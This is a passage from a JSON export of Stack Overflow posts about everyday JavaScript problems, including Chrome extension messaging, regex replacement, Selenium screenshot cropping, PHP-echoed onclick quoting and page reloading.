"https://lh3.googleusercontent.com/-ZUbnfpXrdVA/AAAAAAAAAAI/AAAAAAAAABE/g1lSMuM37RE/photo.jpg?sz=128", "display_name": "Eugene Chefranov", "link": "https://stackoverflow.com/users/11541482/eugene-chefranov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 180, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1558563725, "creation_date": 1558556098, "last_edit_date": 1558557136, "question_id": 56264343, "link": "https://stackoverflow.com/questions/56264343/how-to-send-data-between-background-js-and-popup-js-if-popup-is-closed", "title": "How to send data between background.js and popup.js if popup is closed?", "body": "<p>I need to send data from popup.js to background.js and after that to send from background.js to popup.js. But if popup.html closed it can't recive data from background.js because port doesn't exist. How to resolve it?</p>\n\n<p>My code:</p>\n\n<p>popup.js</p>\n\n<pre><code>var port = chrome.runtime.connect({ \nname: 'Communication with background.js', \n});\n\nport.postMessage(\"Hi BackGround\");\nport.onMessage.addListener(function(msg) {\nconsole.log(\"message recieved\" + msg);\n});\n</code></pre>\n\n<p>background.js</p>\n\n<pre><code>chrome.runtime.onConnect.addListener(function(port) {\nconsole.log(\"Connected .....\");\nport.onMessage.addListener(function(msg) {\nconsole.log(\"message recieved \" + msg);\nport.postMessage(\"Hi Popup.js\");\n});\n});\n</code></pre>\n"}, {"tags": ["javascript", "regex", "regex-group"], "comments": [{"owner": {"reputation": 966, "user_id": 3535760, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/FQ2Hn.jpg?s=128&g=1", "display_name": "viz", "link": "https://stackoverflow.com/users/3535760/viz"}, "edited": false, "score": 4, "creation_date": 1558555698, "post_id": 56264249, "comment_id": 99144852, "body": "I don&#39;t think it has anything to do with typescript"}, {"owner": {"reputation": 54898, "user_id": 1260204, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/402e1da680f92d16e7736ab14a696f06?s=128&d=identicon&r=PG", "display_name": "Igor", "link": "https://stackoverflow.com/users/1260204/igor"}, "edited": false, "score": 1, "creation_date": 1558555842, "post_id": 56264249, "comment_id": 99144915, "body": "See also <a href=\"https://stackoverflow.com/questions/3890680\">Using regular expressions (regex) to replace selected text in jQuery / JavaScript</a>"}, {"owner": {"reputation": 299695, "user_id": 507674, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/6801bf30e40c9f7972987d67e2d5e4f2?s=128&d=identicon&r=PG", "display_name": "Niet the Dark Absol", "link": "https://stackoverflow.com/users/507674/niet-the-dark-absol"}, "edited": false, "score": 2, "creation_date": 1558556564, "post_id": 56264249, "comment_id": 99145265, "body": "<code>str.replace(&#47;%.*?%&#47;, m=&gt;{m = m.slice(1,-1); console.log(`Found ${m}`); return `{{${m}}}`;});</code>"}], "owner": {"reputation": 2133, "user_id": 920504, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/a943236432e5080a1167ac6f12c0cc39?s=128&d=identicon&r=PG", "display_name": "Jay", "link": "https://stackoverflow.com/users/920504/jay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 37, "favorite_count": 0, "closed_date": 1558555936, "answer_count": 0, "score": 1, "last_activity_date": 1558556591, "creation_date": 1558555642, "last_edit_date": 1558556591, "question_id": 56264249, "link": "https://stackoverflow.com/questions/56264249/regex-for-finding-first-and-last-names", "closed_reason": "Duplicate", "title": "RegEx for finding first and last names", "body": "<p>I have a string like \"today is %date%, my name is %firstName% %lastName%\"</p>\n\n<p>Using regular expression I want to replace the %date% with todays date, same goes for firstName and lastName</p>\n\n<p>I did something like </p>\n\n<pre><code>  let reg = new RegExp(/\\%(.*?)\\%/g); // this gives me the values inside % \n    val = reg.exec(value);\n</code></pre>\n\n<p>How do I replace the existing string with the values.</p>\n\n<p>EDIT: If I do something like\n    str.replace((/\\%(.*?)\\%/g), 'test');\nIt does replace all the values with test how do I get the value that was replaced like: </p>\n\n<blockquote>\n  <p>today is %date%, my name is %firstName% %lastName%</p>\n  \n  <p>today is {{date}}, my name is {{firstName}} {{lastName}}</p>\n</blockquote>\n\n<p>How do I solve this problem? </p>\n"}, {"tags": ["javascript", "locale", "number-formatting"], "comments": [{"owner": {"reputation": 6856, "user_id": 828864, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f0031af6f469d31621363e4fdf14601f?s=128&d=identicon&r=PG", "display_name": "skyline3000", "link": "https://stackoverflow.com/users/828864/skyline3000"}, "edited": false, "score": 0, "creation_date": 1558556489, "post_id": 56264209, "comment_id": 99145221, "body": "Did you try it? There&#39;s a fallback mechanism for the string supplied. e.g. <code>1234567.89.toLocaleString()</code> with &quot;us&quot; and &quot;uk&quot; yields different and correct results."}, {"owner": {"reputation": 1, "user_id": 4784299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51b3b58e30e0b0d78202601049029fbe?s=128&d=identicon&r=PG&f=1", "display_name": "Lorenzo Valente", "link": "https://stackoverflow.com/users/4784299/lorenzo-valente"}, "reply_to_user": {"reputation": 6856, "user_id": 828864, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f0031af6f469d31621363e4fdf14601f?s=128&d=identicon&r=PG", "display_name": "skyline3000", "link": "https://stackoverflow.com/users/828864/skyline3000"}, "edited": false, "score": 0, "creation_date": 1558557476, "post_id": 56264209, "comment_id": 99145661, "body": "Unfortunately there is a difference between 3166 and 639-1 for some countries (Vietnam has VN for 3166 and vi for 639-1). A Java implementation would also be ok if it solves the problem, but I have already tried using DecimalFormat and for some countries it doesn&#39;t work (does not return space thousand separator) or it differs with the result returned from JS` Number.toLocaleString."}], "owner": {"reputation": 1, "user_id": 4784299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51b3b58e30e0b0d78202601049029fbe?s=128&d=identicon&r=PG&f=1", "display_name": "Lorenzo Valente", "link": "https://stackoverflow.com/users/4784299/lorenzo-valente"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 38, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1558555514, "creation_date": 1558555514, "question_id": 56264209, "link": "https://stackoverflow.com/questions/56264209/get-number-tolocalestring-passing-an-iso-3166-alpha-2-code", "title": "Get Number.toLocaleString passing an ISO 3166 Alpha 2 code", "body": "<p>I need to get a country's number representation by passing it the country's Alpha 2 code (for example GB, IT, VN) in JavaScript.</p>\n\n<p>From what I've seen in the docs you can only pass it the ISO 639-1 code? (for example en_US). If it's not possible to pass it the 3166 code directly then I would need a way to convert such code into the language code.</p>\n\n<p>Can you please help?</p>\n\n<p>Thanks </p>\n"}, {"tags": ["javascript"], "comments": [{"owner": {"reputation": 1037, "user_id": 4374150, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ODuVG.jpg?s=128&g=1", "display_name": "Paula Livingstone", "link": "https://stackoverflow.com/users/4374150/paula-livingstone"}, "edited": false, "score": 0, "creation_date": 1558555638, "post_id": 56264197, "comment_id": 99144829, "body": "try console logging drumArray[i] at the start of the loop and see what its pushing out"}, {"owner": {"reputation": 4237, "user_id": 10787900, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-4Z6j7Qhowx8/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-ighhCw1JxvK6l7ZVG0ZYElO2DSUA/mo/photo.jpg?sz=128", "display_name": "Bibberty", "link": "https://stackoverflow.com/users/10787900/bibberty"}, "edited": false, "score": 0, "creation_date": 1558555640, "post_id": 56264197, "comment_id": 99144831, "body": "Ok, you do not need a switch there as you are assigning click direct to the button itself."}, {"owner": {"reputation": 35, "user_id": 7580253, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-hSB4mCWwubM/AAAAAAAAAAI/AAAAAAAAACU/O0Q-fIN3n2M/photo.jpg?sz=128", "display_name": "Yash Kumar Sati", "link": "https://stackoverflow.com/users/7580253/yash-kumar-sati"}, "reply_to_user": {"reputation": 1037, "user_id": 4374150, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ODuVG.jpg?s=128&g=1", "display_name": "Paula Livingstone", "link": "https://stackoverflow.com/users/4374150/paula-livingstone"}, "edited": false, "score": 0, "creation_date": 1558556189, "post_id": 56264197, "comment_id": 99145067, "body": "@PaulaLivingstone it logs out the button HTML from the drumArray"}], "answers": [{"tags": [], "owner": {"reputation": 4237, "user_id": 10787900, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-4Z6j7Qhowx8/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-ighhCw1JxvK6l7ZVG0ZYElO2DSUA/mo/photo.jpg?sz=128", "display_name": "Bibberty", "link": "https://stackoverflow.com/users/10787900/bibberty"}, "is_accepted": false, "score": 0, "last_activity_date": 1558555750, "creation_date": 1558555750, "answer_id": 56264269, "question_id": 56264197, "link": "https://stackoverflow.com/questions/56264197/cannot-read-property-innertext-of-undefined-code-structure-explanation-requir/56264269#56264269", "title": "Cannot read property &#39;innerText&#39; of undefined? Code structure Explanation Required", "body": "<p>You are assigning <code>click</code> to the button, so you need to take in the <code>EventArgs</code>.</p>\n\n<p>Here we added <code>e</code>, this will allow use to get to <code>e.target</code> - in this case your button.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var drumArray = document.querySelectorAll('.drum');\r\n\r\nfor (var i = 0; i &lt; drumArray.length; i++) {\r\n  drumArray[i].addEventListener(\"click\", function(e) {\r\n    // e is the event.\r\n    // target is the item clicked.\r\n    switch (e.target.innerText) { //Problem here\r\n      case \"w\":\r\n        var drumAudio = new Audio('./sounds/tom-1.mp3');\r\n        drumAudio.play();\r\n        break;\r\n      case \"a\":\r\n        var drumAudio1 = new Audio('./sounds/tom-2.mp3');\r\n        drumAudio1.play();\r\n        break;\r\n      case \"s\":\r\n        var drumAudio2 = new Audio('./sounds/tom-3.mp3');\r\n        drumAudio2.play();\r\n        break;\r\n      case \"d\":\r\n        var drumAudio3 = new Audio('./sounds/tom-4.mp3');\r\n        drumAudio3.play();\r\n        break;\r\n      case \"j\":\r\n        var drumAudio4 = new Audio('./sounds/snare.mp3');\r\n        drumAudio4.play();\r\n        break;\r\n      case \"k\":\r\n        var drumAudio5 = new Audio('./sounds/crash.mp3');\r\n        drumAudio5.play();\r\n        break;\r\n      case \"l\":\r\n        var drumAudio6 = new Audio('./sounds/kick-bass.mp3');\r\n        drumAudio6.play();\r\n        break;\r\n    }\r\n\r\n  });\r\n}</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 35, "user_id": 7580253, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-hSB4mCWwubM/AAAAAAAAAAI/AAAAAAAAACU/O0Q-fIN3n2M/photo.jpg?sz=128", "display_name": "Yash Kumar Sati", "link": "https://stackoverflow.com/users/7580253/yash-kumar-sati"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 14, "favorite_count": 0, "closed_date": 1558555787, "answer_count": 1, "score": 0, "last_activity_date": 1558555750, "creation_date": 1558555484, "question_id": 56264197, "link": "https://stackoverflow.com/questions/56264197/cannot-read-property-innertext-of-undefined-code-structure-explanation-requir", "closed_reason": "Duplicate", "title": "Cannot read property &#39;innerText&#39; of undefined? Code structure Explanation Required", "body": "<p>Here's the problem: I've 7 buttons in which I have to add event listener which will respond to click and play the respective sound whenever any button is clicked. I used querySelectorAll() method to select all those classes and added event listener to all those buttons using loops but the audio is not playing due to some problem in switch case expression i.e drumArray[i].innerText and I want to get explanation of the error why &amp; how it is causing. I mean like how the switch statement terminated due to this error.</p>\n\n<p>I know the switch case expression can be resolved by using this.innerText but I want to know why the following drumArray[i].innerText is not valid!</p>\n\n<pre><code>var drumArray = document.querySelectorAll('.drum');\n\nfor (var i = 0; i &lt; drumArray.length; i++) {\n  drumArray[i].addEventListener(\"click\", function() {\n\n    switch (drumArray[i].innerText) { //Problem here\n      case \"w\":\n        var drumAudio = new Audio('./sounds/tom-1.mp3');\n        drumAudio.play();\n        break;\n      case \"a\":\n        var drumAudio1 = new Audio('./sounds/tom-2.mp3');\n        drumAudio1.play();\n        break;\n      case \"s\":\n        var drumAudio2 = new Audio('./sounds/tom-3.mp3');\n        drumAudio2.play();\n        break;\n      case \"d\":\n        var drumAudio3 = new Audio('./sounds/tom-4.mp3');\n        drumAudio3.play();\n        break;\n      case \"j\":\n        var drumAudio4 = new Audio('./sounds/snare.mp3');\n        drumAudio4.play();\n        break;\n      case \"k\":\n        var drumAudio5 = new Audio('./sounds/crash.mp3');\n        drumAudio5.play();\n        break;\n      case \"l\":\n        var drumAudio6 = new Audio('./sounds/kick-bass.mp3');\n        drumAudio6.play();\n        break;\n    }\n\n  });\n}\n\n</code></pre>\n"}, {"tags": ["javascript", "function", "url"], "answers": [{"comments": [{"owner": {"reputation": 499, "user_id": 11306943, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-1de7_qt0tf0/AAAAAAAAAAI/AAAAAAAAAIA/OTNkDOsPqBk/photo.jpg?sz=128", "display_name": "DasElias", "link": "https://stackoverflow.com/users/11306943/daselias"}, "edited": false, "score": 0, "creation_date": 1558729051, "post_id": 56298672, "comment_id": 99210395, "body": "<code>onclick=&#39;myModal(&#39;red&#39;</code> The client is interpreting only <code>myModal(</code> as the onclick-string since you are closing the string with the quotation marks of &quot;red&quot;."}], "tags": [], "owner": {"reputation": 21, "user_id": 10874801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb27b87151cd53477db09e3aa034a4ea?s=128&d=identicon&r=PG&f=1", "display_name": "Michael W.", "link": "https://stackoverflow.com/users/10874801/michael-w"}, "is_accepted": true, "score": 0, "last_activity_date": 1558726719, "creation_date": 1558726719, "answer_id": 56298672, "question_id": 56264169, "link": "https://stackoverflow.com/questions/56264169/url-in-function-changes-when-i-echo-it-from-php/56298672#56298672", "title": "Url in function changes when i echo it from php", "body": "<p>Oke i don't know why this works and the other way around not but my solution is:</p>\n\n<pre><code>echo \"&lt;button type='submit' onclick='\"; echo 'myModal(\"red\",\"'.$anytext'].'\");'; echo\"'&gt;Click me&lt;/button&gt;\"\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 10874801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb27b87151cd53477db09e3aa034a4ea?s=128&d=identicon&r=PG&f=1", "display_name": "Michael W.", "link": "https://stackoverflow.com/users/10874801/michael-w"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 27, "favorite_count": 0, "accepted_answer_id": 56298672, "answer_count": 1, "score": 1, "last_activity_date": 1558726719, "creation_date": 1558555326, "last_edit_date": 1558555503, "question_id": 56264169, "link": "https://stackoverflow.com/questions/56264169/url-in-function-changes-when-i-echo-it-from-php", "title": "Url in function changes when i echo it from php", "body": "<p>I have a snackbar (small notification popup) and what i try to do is that when you press on a button the color of the box and the text within changes to set variables. This al works. However if i echo the same function within the onclick of an echoed button it messes up the whole function format (see code below)</p>\n\n<p>If tried changing from \" to ' but this does nothing.</p>\n\n<p>The button:</p>\n\n<pre><code>echo \"&lt;button type='submit' onclick='myModal('red','\".$anytext'].\"');'&gt;Click me&lt;/button&gt;\"\n</code></pre>\n\n<p>My modal:</p>\n\n<pre><code>&lt;div id=\"changepopup\"&gt;Error!&lt;/div&gt;\n</code></pre>\n\n<p>Script:</p>\n\n<pre><code> function myModal(color,text) {\n  var x = document.getElementById(\"changepopup\");\n\n    // Zet text in modal\n    x.innerHTML = text;\n\n    // Zet kleur van modal\n    x.style.background = color;\n\n    // Add the \"show\" class to DIV\n    x.className = \"show\";\n\n    // After 3 seconds, remove the show class from DIV\n    setTimeout(function(){ x.className = x.className.replace(\"show\", \"\"); }, 3000);\n  }\n</code></pre>\n\n<p>The button (As shown on the page):</p>\n\n<pre><code>&lt;button type=\"submit\" onclick=\"myModal(\" red','jouw=\"\" status=\"\" is=\"\" vernieuwd');'=\"\"&gt;Click me&lt;/button&gt;\n</code></pre>\n\n<p>What i try to archieve is that the notification popup comes up with the set color and text in it, while being inside an php echo.</p>\n\n<p>Thank you guys and girls for helping me!</p>\n"}, {"tags": ["javascript", "selenium", "selenium-webdriver", "cross-browser", "screenshot"], "comments": [{"owner": {"reputation": 1037, "user_id": 4374150, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ODuVG.jpg?s=128&g=1", "display_name": "Paula Livingstone", "link": "https://stackoverflow.com/users/4374150/paula-livingstone"}, "edited": false, "score": 0, "creation_date": 1558555421, "post_id": 56264139, "comment_id": 99144742, "body": "Javascript is supported in Selenium through the browser. Headless or otherwise"}, {"owner": {"reputation": 85, "user_id": 9254054, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/453791ddbf900afeb9c2bbe5ba3e113b?s=128&d=identicon&r=PG&f=1", "display_name": "Alec Davidson", "link": "https://stackoverflow.com/users/9254054/alec-davidson"}, "reply_to_user": {"reputation": 1037, "user_id": 4374150, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ODuVG.jpg?s=128&g=1", "display_name": "Paula Livingstone", "link": "https://stackoverflow.com/users/4374150/paula-livingstone"}, "edited": false, "score": 0, "creation_date": 1558555717, "post_id": 56264139, "comment_id": 99144867, "body": "@PaulaLivingstone, not relevant to my question. I specified that taking a screenshot of an element with selenium is not supported like it may be with other browser automation frameworks like puppeteer."}, {"owner": {"reputation": 18005, "user_id": 2386774, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dea7da142cb7e85d5d5a8576e2625431?s=128&d=identicon&r=PG", "display_name": "JeffC", "link": "https://stackoverflow.com/users/2386774/jeffc"}, "edited": false, "score": 0, "creation_date": 1558561029, "post_id": 56264139, "comment_id": 99147003, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/13832322/how-to-capture-the-screenshot-of-a-specific-element-rather-than-entire-page-usin\">How to capture the screenshot of a specific element rather than entire page using Selenium Webdriver?</a>"}, {"owner": {"reputation": 53073, "user_id": 16148, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/XTzm1.jpg?s=128&g=1", "display_name": "Corey Goldberg", "link": "https://stackoverflow.com/users/16148/corey-goldberg"}, "edited": false, "score": 1, "creation_date": 1558564589, "post_id": 56264139, "comment_id": 99147956, "body": "why don&#39;t you just call WebElement&#39;s takeScreenshot() method?"}, {"owner": {"reputation": 85, "user_id": 9254054, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/453791ddbf900afeb9c2bbe5ba3e113b?s=128&d=identicon&r=PG&f=1", "display_name": "Alec Davidson", "link": "https://stackoverflow.com/users/9254054/alec-davidson"}, "reply_to_user": {"reputation": 53073, "user_id": 16148, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/XTzm1.jpg?s=128&g=1", "display_name": "Corey Goldberg", "link": "https://stackoverflow.com/users/16148/corey-goldberg"}, "edited": false, "score": 0, "creation_date": 1558570457, "post_id": 56264139, "comment_id": 99149107, "body": "@CoreyGoldberg, not supported in most browsers / drivers and falling back to the fullscreen is not an option in this case."}, {"owner": {"reputation": 85, "user_id": 9254054, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/453791ddbf900afeb9c2bbe5ba3e113b?s=128&d=identicon&r=PG&f=1", "display_name": "Alec Davidson", "link": "https://stackoverflow.com/users/9254054/alec-davidson"}, "reply_to_user": {"reputation": 18005, "user_id": 2386774, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dea7da142cb7e85d5d5a8576e2625431?s=128&d=identicon&r=PG", "display_name": "JeffC", "link": "https://stackoverflow.com/users/2386774/jeffc"}, "edited": false, "score": 0, "creation_date": 1558619136, "post_id": 56264139, "comment_id": 99167649, "body": "@JeffC, none of those solutions worked for me."}, {"owner": {"reputation": 53073, "user_id": 16148, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/XTzm1.jpg?s=128&g=1", "display_name": "Corey Goldberg", "link": "https://stackoverflow.com/users/16148/corey-goldberg"}, "edited": false, "score": 0, "creation_date": 1558619193, "post_id": 56264139, "comment_id": 99167685, "body": "element screenshots are in the webdriver spec and I thought most browsers/drivers were now spec compliant."}, {"owner": {"reputation": 18005, "user_id": 2386774, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dea7da142cb7e85d5d5a8576e2625431?s=128&d=identicon&r=PG", "display_name": "JeffC", "link": "https://stackoverflow.com/users/2386774/jeffc"}, "edited": false, "score": 0, "creation_date": 1558620120, "post_id": 56264139, "comment_id": 99168220, "body": "You are asking us to guess on how to fix your code without actually seeing it. Post an <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>... the code you are using and the actual site (or at least a sample site) so we can see the results and how they aren&#39;t working."}, {"owner": {"reputation": 85, "user_id": 9254054, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/453791ddbf900afeb9c2bbe5ba3e113b?s=128&d=identicon&r=PG&f=1", "display_name": "Alec Davidson", "link": "https://stackoverflow.com/users/9254054/alec-davidson"}, "reply_to_user": {"reputation": 18005, "user_id": 2386774, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dea7da142cb7e85d5d5a8576e2625431?s=128&d=identicon&r=PG", "display_name": "JeffC", "link": "https://stackoverflow.com/users/2386774/jeffc"}, "edited": false, "score": 0, "creation_date": 1558621199, "post_id": 56264139, "comment_id": 99168893, "body": "@JeffC updated with example code"}], "owner": {"reputation": 85, "user_id": 9254054, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/453791ddbf900afeb9c2bbe5ba3e113b?s=128&d=identicon&r=PG&f=1", "display_name": "Alec Davidson", "link": "https://stackoverflow.com/users/9254054/alec-davidson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 265, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1558621884, "creation_date": 1558555226, "last_edit_date": 1558621884, "question_id": 56264139, "link": "https://stackoverflow.com/questions/56264139/how-to-crop-selenium-screenshot-so-that-image-is-the-same-dimensions-as-a-given", "title": "How to crop selenium screenshot so that image is the same dimensions as a given DOM element", "body": "<p>Example screenshot of not centered hackernews header:\n<a href=\"https://i.stack.imgur.com/U0hU7.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/U0hU7.png\" alt=\"attempt to take a screenshot of hackernews header\"></a>I am trying to take a screenshot of a DOM element with Selenium (nodejs). I know this is not supported in Selenium, so my approach has been to take a fullscreen screenshot and then crop the image with the elements dimensions. </p>\n\n<p><strong>My issue is that the x and y location returned by element.getRect() are not lining up with the cropping of the image.</strong> I have also tried executing js (element.getClientBoundingRect()) in the browser.</p>\n\n<p>I have tried using easyimage or sharp to crop the images but something about my dimensions are wrong. I have also tried resizing the image to the viewport width and height with no luck. Any help would be appreciated.</p>\n\n<p>There are multiple similar questions on stack overflow, but no working approaches / solutions for a node environment.</p>\n\n<pre><code>const easyimg = require('easyimage')\nconst webdriver = require('selenium-webdriver'),\n    By = webdriver.By,\n    until = webdriver.until;\n\nconst driver = new webdriver.Builder()\n    .forBrowser('firefox')\n    .build();\n\nwebdriver.WebDriver.prototype.saveScreenshot = async function (path, elem) {\n    const data = elem ? await elem.takeScreenshot() : await driver.takeScreenshot()\n    const base64Data = data.replace(/^data:image\\/png;base64,/, \"\")\n    const error = fs.writeFileSync(`${path}.png`, base64Data, 'base64')\n    if (error) {\n        console.error(error)\n    }\n}\n\n(async () =&gt; {\n\nawait driver.get(url)\nawait driver.saveScreenshot('./images')\n\nconst cropInFile = async function (size, location, srcFile) {\n    await easyimg.crop({\n        src: srcFile,\n        dst: srcFile,\n        cropwidth: size.width,\n        cropheight: size.height,\n        x: location.x,\n        y: location.y,\n        gravity: 'NorthWest'\n    }\n};\n\n const { height, width, x, y } = await driver.executeScript(`return document.querySelector('${selector}').getBoundingClientRect()`)\n const size = {height, width}\n const location = {x, y}\n await cropInFile(size, location, `./images/name.png`)\n})()\n</code></pre>\n"}, {"tags": ["javascript", "html", "page-refresh"], "comments": [{"owner": {"reputation": 4237, "user_id": 10787900, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-4Z6j7Qhowx8/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-ighhCw1JxvK6l7ZVG0ZYElO2DSUA/mo/photo.jpg?sz=128", "display_name": "Bibberty", "link": "https://stackoverflow.com/users/10787900/bibberty"}, "edited": false, "score": 2, "creation_date": 1558555174, "post_id": 56264101, "comment_id": 99144614, "body": "Unless you load the google site into an iFrame you cannot do this."}], "answers": [{"tags": [], "owner": {"reputation": 793711, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "is_accepted": false, "score": 0, "last_activity_date": 1558555283, "creation_date": 1558555283, "answer_id": 56264159, "question_id": 56264101, "link": "https://stackoverflow.com/questions/56264101/how-to-reload-an-html-link-reference/56264159#56264159", "title": "How to reload an html link/reference", "body": "<p>You can't. </p>\n\n<ul>\n<li>There is no general way for a page to affect the next page loaded into a browser</li>\n<li>There is no Google-specific method to cause the page to reload on a timer</li>\n<li>It is possible to do something along these things with a page loaded into an <code>&lt;iframe&gt;</code>, but Google set the <code>X-Frame-Options</code> to forbid third-parties loading their homepage into a frame. </li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 6933, "user_id": 8583669, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4iGwt.jpg?s=128&g=1", "display_name": "johannchopin", "link": "https://stackoverflow.com/users/8583669/johannchopin"}, "is_accepted": false, "score": 0, "last_activity_date": 1558555509, "creation_date": 1558555509, "answer_id": 56264207, "question_id": 56264101, "link": "https://stackoverflow.com/questions/56264101/how-to-reload-an-html-link-reference/56264207#56264207", "title": "How to reload an html link/reference", "body": "<p>Just write an function with <code>window.setInterval()</code> and <code>window.open()</code> like this:</p>\n\n<pre class=\"lang-js prettyprint-override\"><code>window.setInterval(function(){\n    window.open(URL, yourWindowName);\n}, 30000); // Wait 30s\n\n</code></pre>\n\n<p>Don't forget to stop it with <code>clearInterval()</code></p>\n"}], "owner": {"reputation": 1, "user_id": 11499195, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-2tH4SE9yLCs/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdpRXlPHkOpHOWi2vkObj91mVaj-Q/mo/photo.jpg?sz=128", "display_name": "Parshva Shah", "link": "https://stackoverflow.com/users/11499195/parshva-shah"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 35, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1558556865, "creation_date": 1558555045, "question_id": 56264101, "link": "https://stackoverflow.com/questions/56264101/how-to-reload-an-html-link-reference", "title": "How to reload an html link/reference", "body": "<p>I have the following link in my HTML file</p>\n\n<pre><code>&lt;p class = \"card-text\"&gt; This is a title &lt;/p&gt;\n&lt;a href = \"google.com\" class = \"btn btn-success\" target = \"_blank\"&gt; Text &lt;/a&gt;\n</code></pre>\n\n<p>how can I have that after I click the button and go to google, every certain block of time say 30 seconds, google is refreshed/reloaded</p>\n"}, {"tags": ["javascript", "curl", "fetch"], "comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 2, "creation_date": 1558556840, "post_id": 56264083, "comment_id": 99145403, "body": "I don&#39;t think <code>Fetch</code> gives you this level of control."}, {"owner": {"reputation": 61150, "user_id": 441757, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/921df025d1d7c99fad4553ac83bd8bdf?s=128&d=identicon&r=PG", "display_name": "sideshowbarker", "link": "https://stackoverflow.com/users/441757/sideshowbarker"}, "edited": false, "score": 0, "creation_date": 1558565549, "post_id": 56264083, "comment_id": 99148165, "body": "See <a href=\"https://stackoverflow.com/a/49211413/441757\">stackoverflow.com/a/49211413/441757</a>"}, {"owner": {"reputation": 723, "user_id": 5735184, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/H4nIV.png?s=128&g=1", "display_name": "Priansh Shah", "link": "https://stackoverflow.com/users/5735184/priansh-shah"}, "reply_to_user": {"reputation": 61150, "user_id": 441757, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/921df025d1d7c99fad4553ac83bd8bdf?s=128&d=identicon&r=PG", "display_name": "sideshowbarker", "link": "https://stackoverflow.com/users/441757/sideshowbarker"}, "edited": false, "score": 0, "creation_date": 1558573476, "post_id": 56264083, "comment_id": 99149589, "body": "@sideshowbarker so there&#39;s a lot on <i>consuming</i> the data but I&#39;m not worried about the response (the response only comes in the last chunk to begin with so it suffices to treat it as a normal response), specifically I need to send the request body in chunks"}, {"owner": {"reputation": 61150, "user_id": 441757, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/921df025d1d7c99fad4553ac83bd8bdf?s=128&d=identicon&r=PG", "display_name": "sideshowbarker", "link": "https://stackoverflow.com/users/441757/sideshowbarker"}, "edited": false, "score": 1, "creation_date": 1558579513, "post_id": 56264083, "comment_id": 99150620, "body": "Ah OK then maybe see 